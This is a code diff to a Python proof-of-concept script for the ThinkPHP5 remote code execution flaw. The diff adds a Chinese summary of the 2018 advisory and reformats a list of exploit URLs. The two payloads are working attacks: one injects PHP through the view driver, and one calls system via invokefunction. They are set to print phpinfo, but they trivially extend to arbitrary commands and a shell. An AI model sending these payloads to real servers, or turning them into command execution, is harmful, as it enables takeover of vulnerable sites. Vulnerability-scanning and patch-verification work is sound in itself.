@@ -4,6 +4,9 @@
 """
 ThinkPHP5 <=5.0.22/<=5.1.29 远程代码执行漏洞
 
+Desc:
+    2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个5.x系列所有版本存在被getshell的高风险漏洞。由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。
+
 Version
 	ThinkPHP5.0 版本 <= 5.0.22 ThinkPHP5.1 版本 <= 5.1.29
 Usage:
@@ -18,7 +21,10 @@ import requests
 def poc(url):
     url = url if '://' in url else 'http://' + url
     url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
-    payloads = [r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"]
+    payloads = [
+        r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",
+        r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"
+    ]
     for payload in payloads:
         vulnurl = url + payload
         try:
